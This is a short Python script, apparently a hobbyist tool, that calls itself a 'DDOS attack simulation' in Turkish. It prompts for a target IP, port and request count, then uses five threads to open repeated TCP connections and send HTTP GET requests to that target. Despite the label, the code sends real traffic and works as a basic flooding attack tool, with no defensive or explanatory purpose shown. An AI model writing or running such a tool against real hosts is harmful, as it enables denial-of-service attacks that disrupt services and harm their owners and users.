import socket
import threading
import time

def ddos_attack(ip_hedef, port, saldiri_sayisi):
    """Basit bir soket bağlantısı simülasyonu ile 'DDOS' etkisi yaratır."""
    for _ in range(saldiri_sayisi):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip_hedef, port))
            print(f"[+] {ip_hedef}:{port} adresine sahte bağlantı gönderildi.")
            sock.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (ip_hedef, port))
            sock.sendto(("Host: " + ip_hedef + "\r\n\r\n").encode('ascii'), (ip_hedef, port))
            sock.close()
        except socket.error as e:
            print(f"[-] {ip_hedef}:{port} adresine bağlantı hatası: {e}")
        time.sleep(0.05) # Küçük bir gecikme ile daha gerçekçi bir yüklenme efekti

def arayuz():
    print("""
\033[1;31m
 ______  _    _  _____  ______
|  ____|| |  | ||  __ \|  ____|
| |__   | |__| || |  | || |__
|  __|  |  __  || |  | ||  __|
| |____ | |  | || |__| || |____
|______||_|  |_||_____/|______|
\033[0m
\033[1;34mNTRL\033[0m

\033[1;32mDDOS Atak Simülasyonu\033[0m
--------------------------
""")
    ip_hedef = input("\033[1;33mHedef IP Adresi:\033[0m ")
    try:
        port = int(input("\033[1;33mHedef Port (genellikle 80): \033[0m"))
        saldiri_sayisi = int(input("\033[1;33mGönderilecek İstek Sayısı: \033[0m"))
    except ValueError:
        print("\033[1;31m[-] Geçersiz giriş. Port ve istek sayısı tam sayı olmalıdır.\033[0m")
        return

    print("\n\033[1;34m[*] Saldırı başlatılıyor...\033[0m")
    for i in range(5): # Çoklu bağlantı simülasyonu için birkaç thread başlatılabilir
        thread = threading.Thread(target=ddos_attack, args=(ip_hedef, port, saldiri_sayisi // 5))
        thread.start()

if __name__ == "__main__":
    arayuz()
